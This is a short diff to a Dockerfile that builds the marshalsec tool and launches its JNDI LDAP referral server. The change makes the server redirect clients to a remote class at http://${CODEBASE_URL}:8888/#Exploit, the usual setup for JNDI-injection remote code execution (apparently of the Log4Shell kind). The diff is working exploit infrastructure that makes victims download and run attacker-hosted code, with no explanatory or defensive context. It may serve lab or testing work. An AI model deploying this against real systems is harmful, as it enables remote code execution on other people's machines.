@@ -7,7 +7,10 @@ RUN git clone https://github.com/mbechler/marshalsec.git . && \
 
 FROM adoptopenjdk/openjdk8:x86_64-alpine-jdk8u312-b07-slim
 
+ARG CODEBASE_URL
+ENV CODEBASE_URL ${CODEBASE_URL}
+
 EXPOSE 1389
 
 COPY --from=build /app/target/marshalsec-0.0.3-SNAPSHOT-all.jar /app/marshalsec.jar
-CMD java -cp /app/marshalsec.jar marshalsec.jndi.LDAPRefServer
+CMD java -cp /app/marshalsec.jar marshalsec.jndi.LDAPRefServer http://${CODEBASE_URL}:8888/#Exploit
